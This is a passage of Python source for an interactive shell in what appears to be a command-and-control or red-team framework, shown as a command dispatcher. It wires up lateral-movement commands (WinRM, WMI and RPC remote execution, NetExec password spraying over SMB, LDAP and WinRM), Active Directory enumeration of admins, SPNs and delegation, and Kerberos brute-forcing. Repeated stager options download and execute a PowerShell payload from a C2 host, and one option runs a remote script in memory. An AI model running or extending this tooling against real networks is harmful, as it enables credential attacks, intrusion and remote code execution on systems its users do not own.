				parser.add_argument('-p', dest='password', required=True, help='Password for authentication')
				parser.add_argument('-d', dest='domain', help='AD domain for authentication')
				parser.add_argument('-dc', dest='dc_host', help='Hostname of the Domain Controller')
				parser.add_argument('--dc-ip', dest='dc_ip', help='IP address of the Domain Controller')
				parser.add_argument('--local-auth', dest='local_auth', action='store_true', help='Authenticate locally instead of AD domain')
				parser.add_argument('-i', dest='target_ip', required=True, help='Target IP address for WinRM')
				parser.add_argument('-c', '--command', dest='command', required=False, help='Command to run on the remote host')
				parser.add_argument('--exec-url', dest='exec_url', required=False, help='URL of a remote PowerShell script to execute in memory')
				parser.add_argument('--script', dest='script_path', required=False, help='Path to a local PowerShell script to base64 encode and run')
				parser.add_argument('--debug', dest='debug', required=False, action="store_true", help='Enables more verbose output from winrm')
				parser.add_argument("--stager",        dest="stager",   action="store_true", required=False, help="Download & execute payload.ps1 from C2 instead of --command")
				parser.add_argument("--stager-port",   dest="stager_port", type=int, required=False, default=8000, help="Port your HTTP stager is listening on (default: 8000)")
				parser.add_argument("--stager-ip",     dest="stager_ip", required=False, help="IP address to fetch stager payload from")

				try:
					opts = parser.parse_args(parts[1:])

				except SystemExit:
					print(brightyellow + utils.gunnershell_commands["winrm"])
					return

				out = lateral.winrm(
					self.sid,
					self.os_type,
					opts.username,
					opts.password,
					stage_ip = opts.stager_ip,
					domain = opts.domain,
					dc_host = opts.dc_host,
					dc_ip = opts.dc_ip,
					local_auth = opts.local_auth,
					target_ip = opts.target_ip,
					command = opts.command,
					debug = opts.debug,
					exec_url = opts.exec_url,
					script_path = opts.script_path,
					stager   = opts.stager,
					stage_port = opts.stager_port,
					op_id=op_id
				)

				printed = 0

				if out == "ACCESS DENIED LOCAL AUTH":
					printed = 1
					print(brightred + f"[!] Failed to authenticate locally to {opts.target_ip} as {opts.username}")

				elif out == "ACCESS DENIED":
					printed = 1
					print(brightred + f"[!] Failed to authenticate to {opts.target_ip} as {opts.domain}\\{opts.username}")

				elif out == "FLAG ERROR":
					printed = 1

				elif out == "FILE ERROR":
					printed = 1

				elif out and printed != 1:
					print(brightgreen + out)

				else:
					print(brightyellow + "[*] No output or error")
					return
				return

			elif cmd == "netexec" or cmd == "nxc":
				parts = shlex.split(user)
				# 1) no args → list subcommands
				if len(parts) == 1:
					utils.print_help("netexec", gunnershell=True)
					return

				# 2) subcommand parsing
				sub = parts[1].lower()
				if sub == "smb":
					# shift off “netexec smb” so parser sees only smb‑flags
					smb_args = parts[2:]
					parser = QuietParser(prog="netexec smb", add_help=False)
					parser.add_argument("-u", "--users",   dest="userfile", required=True, help="Username for SMB or username file")
					parser.add_argument("-p", "--passes",  dest="passfile", required=True, help="Password for SMB or password file")
					parser.add_argument("-d", "--domain",  dest="domain",   required=False, help="AD domain for authentication")
					parser.add_argument("-t", "--targets", dest="targets",  required=True, help="Single Target, Comma‑sep IPs or CIDRs to spray")
					parser.add_argument("--shares", action="store_true", dest="shares", help="Enumerate SMB shares (only valid when -u and -p are single credentials)")
					parser.add_argument("--stager",        dest="stager",   action="store_true", required=False, help="Download & execute payload.ps1 from C2 instead of --command")
					parser.add_argument("--stager-port",   dest="stager_port", type=int, required=False, default=8000, help="Port your HTTP stager is listening on (default: 8000)")
					parser.add_argument("--stager-ip",     dest="stager_ip", required=False, help="IP address to fetch stager payload from")

					try:
						opts = parser.parse_args(smb_args)

					except SystemExit:
						print(brightyellow + gunnershell_commands["netexec"]["smb"])
						return

					out = lateral.netexec_smb(
						sid      = self.sid,
						userfile = opts.userfile,
						passfile = opts.passfile,
						domain   = opts.domain,
						targets  = opts.targets,
						stage_ip = opts.stager_ip,
						shares   = opts.shares,
						stager   = opts.stager,
						stage_port = opts.stager_port,
						op_id = op_id
					)

					try:
						if out:
							if "[!]" not in out:
								print(brightgreen + out)

							else:
								print(out)

						else:
							print(brightred + f"[!] No output was returned from command...this is weird")

					except Exception as e:
						print(brightred + f"[!] Hit an error parsing output: {e}")
					return

				elif sub == "ldap":
					ldap_args = parts[2:]
					parser = QuietParser(prog="netexec ldap", add_help=False)
					parser.add_argument("-u", "--users", dest="userfile", required=True, help="Username or file")
					parser.add_argument("-p", "--passes", dest="passfile", required=True, help="Password or file")
					parser.add_argument("-d", "--domain", dest="domain", required=True, help="AD domain name")
					parser.add_argument("--dc", dest="dc", required=True, help="Domain Controller hostname or IP")
					parser.add_argument("--ldaps", dest="ldaps", required=False, action="store_true", help="Use LDAPS instead of LDAP")
					parser.add_argument("--port", dest="port", required=False, type=int, help="Port to authenticate over")
					parser.add_argument("--debug", dest="debug", required=False, action="store_true", help="Enable verbose output (detailed errors...etc)")
					parser.add_argument("--stager",        dest="stager",   action="store_true", required=False, help="Download & execute payload.ps1 from C2 instead of --command")
					parser.add_argument("--stager-port",   dest="stager_port", type=int, required=False, default=8000, help="Port your HTTP stager is listening on (default: 8000)")
					parser.add_argument("--stager-ip",     dest="stager_ip", required=False, help="IP address to fetch stager payload from")

					try:
						opts = parser.parse_args(ldap_args)

					except SystemExit:
						print(brightyellow + gunnershell_commands["netexec"]["ldap"])
						return   

					out = lateral.netexec_ldap(
						sid      = self.sid,
						userfile = opts.userfile,
						passfile = opts.passfile,
						domain   = opts.domain,
						dc       = opts.dc,
						stage_ip = opts.stager_ip,
						ldaps    = opts.ldaps,
						port     = opts.port,
						debug    = opts.debug,
						stager   = opts.stager,
						stage_port = opts.stager_port,
						op_id = op_id
					)

					try:
						if out:
							if "[!]" not in out:
								print(brightgreen + out)

							else:
								print(out)

						else:
							print(brightred + f"[!] No output was returned from command...this is weird")

					except Exception as e:
						print(brightred + f"[!] Error running LDAP spray: {e}")
					return

				elif sub == "winrm":
					win_args = parts[2:]
					parser = QuietParser(prog="netexec winrm", add_help=False)
					parser.add_argument("-u","--users", dest="userfile", required=True, help="Username or file of usernames")
					parser.add_argument("-p","--passes", dest="passfile", required=True, help="Password or file of passwords")
					parser.add_argument("-d","--domain", dest="domain", required=True, help="AD domain name")
					parser.add_argument("-t","--targets", dest="targets", required=True, help="Target or comma‑sep list of hostnames/IPs")
					parser.add_argument("--port", dest="port", type=int, required=False, help="WinRM port (5985 or 5986)")
					parser.add_argument("--https", dest="use_https",action="store_true", help="Use HTTPS (default port 5986)")
					parser.add_argument("--sleep-seconds", dest="sleep_seconds", type=int, default=0, help="Pause this many seconds between attempts")
					parser.add_argument("--sleep-minutes", dest="sleep_minutes", type=int, default=0, help="Pause this many minutes between attempts")
					parser.add_argument("--debug", dest="debug", action="store_true", default=False, help="Enable verbose output")
					parser.add_argument("--stager",        dest="stager",   action="store_true", required=False, help="Download & execute payload.ps1 from C2 instead of --command")
					parser.add_argument("--stager-port",   dest="stager_port", type=int, required=False, default=8000, help="Port your HTTP stager is listening on (default: 8000)")
					parser.add_argument("--stager-ip",     dest="stager_ip", required=False, help="IP address to fetch stager payload from")

					try:
						opts = parser.parse_args(win_args)

					except SystemExit:
						print(brightyellow + utils.gunnershell_commands["netexec"]["winrm"])
						return

					out = lateral.netexec_winrm(
						sid = self.sid,
						userfile = opts.userfile,
						passfile = opts.passfile,
						domain = opts.domain,
						targets = opts.targets,
						stage_ip = opts.stager_ip,
						port = opts.port,
						use_https = opts.use_https,
						sleep_seconds = opts.sleep_seconds,
						sleep_minutes = opts.sleep_minutes,
						debug = opts.debug,
						stager   = opts.stager,
						stage_port = opts.stager_port,
						op_id = op_id
					)

					if out:
						if "[!]" not in out:
							print(brightgreen + out)

						else:
							print(out)

					else:
						print(brightred + f"[!] No output was returned from command...this is weird")
					return
							

				# 3) unknown subcommand
				else:
					print(brightyellow + gunnershell_commands["netexec"])
					return

			elif cmd == "rpcexec":
				parts = shlex.split(user)
				p_args = parts[1:]
				parser = QuietParser(prog="rpcexec", add_help=False)
				parser.add_argument("-u","--users", dest="userfile", required=True, help="Username or file")
				parser.add_argument("-p","--passes", dest="passfile", required=True, help="Password or file")
				parser.add_argument("-d","--domain", dest="domain", required=True, help="AD domain")
				parser.add_argument("-t","--targets", dest="targets", required=True, help="Host or comma‑list")
				parser.add_argument("--command", dest="cmd", required=True, help="Command to run on target")
				parser.add_argument("--svcname", dest="svcname", required=False, default="GunnerSvc", help="Service name to use")
				parser.add_argument("--cleanup", dest="cleanup", required=False, action="store_true", help="Remove svc & exe after run")
				parser.add_argument("--debug", dest="debug", action="store_true", required=False, help="Verbose")
				parser.add_argument("--stager",        dest="stager",   action="store_true", required=False, help="Download & execute payload.ps1 from C2 instead of --command")
				parser.add_argument("--stager-port",   dest="stager_port", type=int, required=False, default=8000, help="Port your HTTP stager is listening on (default: 8000)")
				parser.add_argument("--stager-ip",     dest="stager_ip", required=False, help="IP address to fetch stager payload from")

				try:
					opts = parser.parse_args(p_args)

				except SystemExit:
					print(brightyellow + gunnershell_commands["rpcexec"])
					return

				out = lateral.rpcexec(
					sid      = self.sid,
					userfile = opts.userfile,
					passfile = opts.passfile,
					domain   = opts.domain,
					targets  = opts.targets,
					command  = opts.cmd,
					stage_ip = opts.stager_ip,
					svcname  = opts.svcname,
					cleanup  = opts.cleanup,
					debug    = opts.debug,
					stager   = opts.stager,
					stage_port = opts.stager_port,
					op_id = op_id
				)
				if out:
					if "[!]" not in out:
						print(brightgreen + out)

					else:
						print(out)

				else:
					print(brightred + f"[!] No output was returned from command...this is weird")
				return

			elif cmd == "wmiexec":
				parts = shlex.split(user)
				parser = QuietParser(prog="wmiexec", add_help=False)
				parser.add_argument("-u", "--user",    dest="user",     required=True, help="Username for auth")
				parser.add_argument("-p", "--pass",    dest="password", required=True, help="Password for auth")
				parser.add_argument("-d", "--domain",  dest="domain",   required=True, help="AD domain or machine")
				parser.add_argument("-t", "--target",  dest="target",   required=True, help="Target IP or hostname")
				parser.add_argument("--command",       dest="command",  required=True, help="Command to run")
				parser.add_argument("--debug",         dest="debug",    action="store_true", required=False, help="Show raw output")
				parser.add_argument("--stager",        dest="stager",   action="store_true", required=False, help="Download & execute payload.ps1 from C2 instead of --command")
				parser.add_argument("--stager-port",   dest="stager_port", type=int, required=False, default=8000, help="Port your HTTP stager is listening on (default: 8000)")
				parser.add_argument("--stager-ip",     dest="stager_ip", required=False, help="IP address to fetch stager payload from")
				try:
					opts = parser.parse_args(parts[1:])

				except SystemExit:
					print(brightyellow + utils.gunnershell_commands["wmiexec"])
					return

				out = lateral.wmiexec(
					sid      = self.sid,
					username = opts.user,
					password = opts.password,
					domain   = opts.domain,
					target   = opts.target,
					command  = opts.command,
					stage_ip = opts.stager_ip,
					debug    = opts.debug,
					stager   = opts.stager,
					stage_port = opts.stager_port,
					op_id = op_id
				)
				if out:
					if "[!]" not in out:
						print(brightgreen + out)

					else:
						print(out)

				else:
					print(brightred + f"[!] No output was returned from command...this is weird")
				return

			#################################################################################################
			##################################Active Directory Commands######################################
			#################################################################################################
			#################################################################################################

			elif cmd == "getusers":
				parts = shlex.split(user)
				parser = QuietParser(prog="getusers", add_help=False)
				parser.add_argument("-f", "--filter", dest="username", required=False, help="Username to fetch all AD properties for")
				parser.add_argument("-d", "--domain", dest="domain", required=False, help="AD domain name (FQDN) or NetBIOS")
				parser.add_argument("--dc-ip", dest="dc_ip", required=False, help="IP address of the Domain Controller")
		
				try:
					opts = parser.parse_args(parts[1:])

				except SystemExit:
					print(brightyellow + utils.gunnershell_commands["getusers"])
					return

				out = ad.getusers(
					sid = self.sid,
					os_type = self.os_type,
					username = opts.username,
					domain = opts.domain,
					dc_ip = opts.dc_ip,
				)

				if out:
					if "[!]" not in out:
						print(brightgreen + out)
					else:
						print(out)
					
				else:
					print(brightred + f"[!] No output was returned from command...this is weird")
				return

			elif cmd == "getgroups":
				parts = shlex.split(user)
				parser = QuietParser(prog="getgroups", add_help=False)
				parser.add_argument("-d", "--domain", dest="domain", required=False, help="AD domain name (FQDN) or NetBIOS")
				parser.add_argument("--dc-ip", dest="dc_ip", required=False, help="IP address of the Domain Controller")
				parser.add_argument("-g", "--group", dest="group", required=False, help="AD Group to enumerate")
				parser.add_argument("-m", "--members", dest="members", action="store_true", required=False, help="List members of the group (requires -g)")
				try:
					opts = parser.parse_args(parts[1:])

				except SystemExit:
					print(brightyellow + utils.gunnershell_commands["getgroups"])
					return

				if opts.members and not opts.group:
					print(brightyellow + "[*] The --members flag requires -g/--group")
					return

				out = ad.getgroups(
					sid = self.sid,
					group = opts.group,
					domain = opts.domain,
					dc_ip = opts.dc_ip,
					members = opts.members,
				)
				if out:
					if "[!]" not in out:
						print(brightgreen + out)

					else:
						print(out)
				else:
					print(brightred + "[!] No output was returned from command… this is weird")
				return

			elif cmd == "getcomputers":
				parts = shlex.split(user)
				parser = QuietParser(prog="getcomputers", add_help=False)
				parser.add_argument("-n", "--name",   dest="computer", required=False, help="Computer SamAccountName to fetch AD properties for")
				parser.add_argument("-d", "--domain", dest="domain",   required=False, help="AD domain name (FQDN) or NetBIOS")
				parser.add_argument("--dc-ip",        dest="dc_ip",    required=False, help="IP address of the Domain Controller")

				try:
					opts = parser.parse_args(parts[1:])
				except SystemExit:
					print(brightyellow + utils.gunnershell_commands["getcomputers"])
					return

				out = ad.getcomputers(
					sid      = self.sid,
					computer = opts.computer,
					domain   = opts.domain,
					dc_ip    = opts.dc_ip,
				)

				if out:
					if "[!]" not in out:
						print(brightgreen + out)

					else:
						print(out)
				else:
					print(brightred + "[!] No output was returned from command… this is weird")

				return

			elif cmd == "getdomaincontrollers" or cmd == "getdcs":
				parts = shlex.split(user)
				parser = QuietParser(prog="getdomaincontrollers", add_help=False)
				parser.add_argument("-d", "--domain", dest="domain", required=False, help="AD domain name (FQDN) or NetBIOS")
				parser.add_argument("--dc-ip", dest="dc_ip", required=False, help="IP address of the Domain Controller")
				parser.add_argument("-e", "--enterprise", action="store_true", dest="enterprise", help="Enumerate DCs across the entire forest")

				try:
					opts = parser.parse_args(parts[1:])
				except SystemExit:
					print(brightyellow + utils.gunnershell_commands["getdomaincontrollers"])
					return

				out = ad.getdomaincontrollers(
					sid         = self.sid,
					domain      = opts.domain,
					dc_ip       = opts.dc_ip,
					enterprise  = opts.enterprise,
				)

				if out:
					if "[!]" not in out:
						print(brightgreen + out)

					else:
						print(out)
						
				else:
					print(brightred + "[!] No output was returned from command… this is weird")

				return

			elif cmd == "getous":
				parts = shlex.split(user)
				parser = QuietParser(prog="getous", add_help=False)
				parser.add_argument("-o", "--ou",    dest="ou",     required=False, help="OU name to fetch AD properties for")
				parser.add_argument("-d", "--domain",dest="domain", required=False, help="AD domain (FQDN or NetBIOS)")
				parser.add_argument("--dc-ip",       dest="dc_ip",  required=False, help="IP of the Domain Controller")

				try:
					opts = parser.parse_args(parts[1:])
				except SystemExit:
					print(brightyellow + utils.gunnershell_commands["getous"])
					return

				out = ad.getous(
					sid    = self.sid,
					ou     = opts.ou,
					domain = opts.domain,
					dc_ip  = opts.dc_ip,
				)

				if out:
					if "[!]" not in out:
						print(brightgreen + out)

					else:
						print(out)
				else:
					print(brightred + "[!] No output was returned from command… this is weird")

				return

			elif cmd == "getgpos":
				parts = shlex.split(user)
				parser = QuietParser(prog="getgpos", add_help=False)
				parser.add_argument("-n", "--name", dest="name", required=False, help="GPO DisplayName to fetch all AD properties for")
				parser.add_argument("-d", "--domain", dest="domain", required=False, help="AD domain name (FQDN) or NetBIOS")
				parser.add_argument("--dc-ip", dest="dc_ip", required=False, help="IP address of the Domain Controller")

				try:
					opts = parser.parse_args(parts[1:])
				except SystemExit:
					print(brightyellow + utils.gunnershell_commands["getgpos"])
					return

				out = ad.getgpos(
					sid    = self.sid,
					name   = opts.name,
					domain = opts.domain,
					dc_ip  = opts.dc_ip,
				)

				if out:
					if "[!]" not in out:
						print(brightgreen + out)

					else:
						print(out)
				else:
					print(brightred + "[!] No output was returned from command...this is weird")
				return

			elif cmd == "getdomain":
				parts = shlex.split(user)
				parser = QuietParser(prog="getdomain", add_help=False)
				parser.add_argument("-d", "--domain", dest="domain", required=False, help="AD domain name (FQDN) or NetBIOS")
				parser.add_argument("--dc-ip", dest="dc_ip", required=False, help="IP address of the Domain Controller")

				try:
					opts = parser.parse_args(parts[1:])
				except SystemExit:
					print(brightyellow + utils.gunnershell_commands["getdomain"])
					return

				out = ad.getdomain(
					sid = self.sid,
					domain = opts.domain,
					dc_ip = opts.dc_ip,
				)

				if out:
					if "[!]" not in out:
						print(brightgreen + out)

					else:
						print(out)
				else:
					print(brightred + "[!] No output was returned from command… this is weird")

				return

			elif cmd == "gettrusts":
				parts = shlex.split(user)
				parser = QuietParser(prog="gettrusts", add_help=False)
				parser.add_argument("-d", "--domain", dest="domain", required=False, help="AD domain name (FQDN) or NetBIOS")
				parser.add_argument("--dc-ip", dest="dc_ip", required=False, help="IP address of the Domain Controller")
				parser.add_argument("-n", "--name", dest="name", required=False, help="Name of a single trust to dump all properties")

				try:
					opts = parser.parse_args(parts[1:])
				except SystemExit:
					print(brightyellow + utils.gunnershell_commands["gettrusts"])
					return

				out = ad.gettrusts(
					sid     = self.sid,
					domain  = opts.domain,
					dc_ip   = opts.dc_ip,
					name    = opts.name,
				)

				if out:
					if "[!]" not in out:
						print(brightgreen + out)
					else:
						print(out)
				else:
					print(brightred + "[!] No output was returned from command… this is weird")

				return

			elif cmd == "getforests":
				parts = shlex.split(user)
				parser = QuietParser(prog="getforests", add_help=False)
				parser.add_argument("-n", "--name",   dest="name",   required=False, help="Forest DNS name to dump properties for")
				parser.add_argument("-d", "--domain", dest="domain", required=False, help="AD domain name (FQDN) or NetBIOS")
				parser.add_argument("--dc-ip",        dest="dc_ip",  required=False, help="IP address of the Domain Controller")

				try:
					opts = parser.parse_args(parts[1:])
				except SystemExit:
					print(brightyellow + utils.gunnershell_commands["getforests"])
					return

				out = ad.getforest(
					sid    = self.sid,
					name   = opts.name,
					domain = opts.domain,
					dc_ip  = opts.dc_ip,
				)

				if out:
					if "[!]" not in out:
						print(brightgreen + out)

					else:
						print(out)
				else:
					print(brightred + "[!] No output was returned from command… this is weird")

				return

			elif cmd == "getfsmo":
				parts = shlex.split(user)
				parser = QuietParser(prog="getfsmo", add_help=False)
				parser.add_argument("-d", "--domain", dest="domain", required=False, help="AD domain name (FQDN) or NetBIOS")
				parser.add_argument("--dc-ip", dest="dc_ip", required=False, help="IP address of the Domain Controller")

				try:
					opts = parser.parse_args(parts[1:])
				except SystemExit:
					print(brightyellow + utils.gunnershell_commands["getfsmo"])
					return

				out = ad.getfsmo(
					sid     = self.sid,
					domain  = opts.domain,
					dc_ip   = opts.dc_ip,
				)

				if out:
					if "[!]" not in out:
						print(brightgreen + out)

					else:
						print(out)
				else:
					print(brightred + "[!] No output was returned from command…this is weird")

				return

			elif cmd == "getpwpolicy":
				parts = shlex.split(user)
				parser = QuietParser(prog="getdomainpolicy", add_help=False)
				parser.add_argument("-d", "--domain", dest="domain", required=False, help="AD domain name (FQDN) or NetBIOS")
				parser.add_argument("--dc-ip", dest="dc_ip", required=False, help="IP address of the Domain Controller")

				try:
					opts = parser.parse_args(parts[1:])
				except SystemExit:
					print(brightyellow + utils.gunnershell_commands["getdomainpolicy"])
					return

				out = ad.getdomainpolicy(
					sid     = self.sid,
					domain  = opts.domain,
					dc_ip   = opts.dc_ip,
				)

				if out:
					if "[!]" not in out:
						print(brightgreen + out)

					else:
						print(out)

				else:
					print(brightred + "[!] No output was returned from command…this is weird")

				return

			elif cmd == "getdelegation":
				parts = shlex.split(user)
				parser = QuietParser(prog="getdelegation", add_help=False)
				parser.add_argument("-d", "--domain", dest="domain", required=False, help="AD domain name (FQDN) or NetBIOS")
				parser.add_argument("--dc-ip", dest="dc_ip", required=False, help="IP address of the Domain Controller")

				try:
					opts = parser.parse_args(parts[1:])
				except SystemExit:
					print(brightyellow + utils.gunnershell_commands["getdelegation"])
					return

				out = ad.getdelegation(
					sid     = self.sid,
					domain  = opts.domain,
					dc_ip   = opts.dc_ip,
				)

				if out:
					if "[!]" not in out:
						print(brightgreen + out)

					else:
						print(out)

				else:
					print(brightred + "[!] No output was returned from command…this is weird")
				return

			elif cmd == "getadmins":
				parts = shlex.split(user)
				parser = QuietParser(prog="getadmins", add_help=False)
				parser.add_argument("-d", "--domain", dest="domain", required=False, help="AD domain name (FQDN) or NetBIOS")
				parser.add_argument("--dc-ip",      dest="dc_ip",   required=False, help="IP address of the Domain Controller")

				try:
					opts = parser.parse_args(parts[1:])
				except SystemExit:
					print(brightyellow + utils.gunnershell_commands["getadmins"])
					return

				out = ad.getadmins(
					sid    = self.sid,
					domain = opts.domain,
					dc_ip  = opts.dc_ip,
				)

				if out:
					if "[!]" not in out:
						print(brightgreen + out)

					else:
						print(out)
				else:
					print(brightred + "[!] No output was returned from command… this is weird")
				return

			elif cmd == "getspns":
				parts = shlex.split(user)
				parser = QuietParser(prog="getspns", add_help=False)
				parser.add_argument("-d", "--domain", dest="domain", required=False,help="AD domain name (FQDN) or NetBIOS")
				parser.add_argument("--dc-ip", dest="dc_ip", required=False, help="IP address of the Domain Controller")

				try:
					opts = parser.parse_args(parts[1:])
				except SystemExit:
					print(brightyellow + utils.gunnershell_commands["getspns"])
					return

				out = ad.getspns(
					sid    = self.sid,
					domain = opts.domain,
					dc_ip  = opts.dc_ip,
				)

				if out:
					if "[!]" not in out:
						print(brightgreen + out)

					else:
						print(out)
				else:
					print(brightred + "[!] No output returned…")
				return

			elif cmd == "kerbrute":
				parts = shlex.split(user)
				if len(parts) == 1:
					utils.print_help("kerbrute", gunnershell=True)
					return

				sub = parts[1].lower()
				if sub == "bruteforce":
					parser = QuietParser(prog="kerbrute bruteforce", add_help=False)
					parser.add_argument("-u", dest="userfile", required=False, help="Local user or user‑list file")
					parser.add_argument("-p", dest="passfile", required=False, help="Local pass or pass‑list file")
					parser.add_argument("-d", dest="domain", required=True, help="AD domain (FQDN)")
					parser.add_argument("--dc-ip", dest="dc_ip", required=True, help="Domain Controller IP")
					parser.add_argument("-C", dest="credfile", help="Local user:pass spray file")

					try:
						opts = parser.parse_args(parts[2:])

					except SystemExit:
						print(brightyellow + utils.gunnershell_commands["kerbrute"]["bruteforce"])
						return

					out = ad.kerbrute_bruteforce(
						self.sid,
						opts.userfile,
						opts.passfile,
						opts.domain,
						dc_ip    = opts.dc_ip,
						credfile = opts.credfile
					)

					if out:
						if "[!]" not in out:
							print(brightgreen + out)

						else:
							print(out)

					else:
						print(brightyellow + "[*] No hits")
					return

				elif sub == "userenum":
					parser = QuietParser(prog="kerbrute userenum", add_help=False)
					parser.add_argument("-d", dest="domain", required=True, help="AD domain (FQDN)")
					parser.add_argument("--dc-ip", dest="dc_ip", help="Domain Controller IP")
					parser.add_argument("-u", dest="user", required=True, help="Local user or user‑list file or comma‑list")

					try:
						opts = parser.parse_args(parts[2:])
					except SystemExit:
						print(brightyellow + utils.gunnershell_commands["kerbrute"]["userenum"])
						return

					out = ad.kerbrute_userenum(
						self.sid,
						opts.domain,
						dc_ip = opts.dc_ip,
						user  = opts.user
					)
						
					if out:
						if "[!]" not in out:
							print(brightgreen + out)

						else:
							print(out)

					else:
						print(brightyellow + "[*] No valid users found")
					return

				else:
					print(brightyellow + gunnershell_commands["kerbrute"]["_desc"])
					return

			else:
				print(brightred + f"[!] Unknown command!")
				return

		except (EOFError, KeyboardInterrupt):
			print()

	def loop(self, cmd=None, to_console=True, op_id=None):
		#print("TEST IN GUNNERSHELL LOOP")
		set_output_context(to_console=to_console, to_op=op_id)
		logger.debug("GunnerShell.loop entry: cmd=%r, to_console=%r, op_id=%r", cmd, to_console, op_id)
		if not cmd:
			logger.debug("Entering interactive mode")
			while True:
				readline.clear_history()
				readline.set_completer(self.completer)
				readline.parse_and_bind("tab: complete")

				if not os.path.exists(self.SESSION_HIST):
						# create an empty history file
						open(self.SESSION_HIST, 'a').close()
		
				readline.read_history_file(self.SESSION_HIST)

				try:
					user = input(self.prompt).strip()
					logger.debug("Read user input: %r", user)

					if not user:
						logger.debug("Empty input, reprompting")
						continue

					else:
						out = self.interact(user, to_console=to_console, op_id=op_id)
						if out:
							return out

				finally:
					try:
						readline.write_history_file(self.SESSION_HIST)

					except Exception:
						pass

					readline.clear_history()

					# restore no-completer
					readline.set_completer(None)

		else:
			logger.debug("Dispatching to interact()")
			out = self.interact(cmd=cmd, to_console=to_console, op_id=op_id)
			logger.debug("interact() returned: %r", out)
			if out:
				logger.debug("Returning from loop with output")
				return out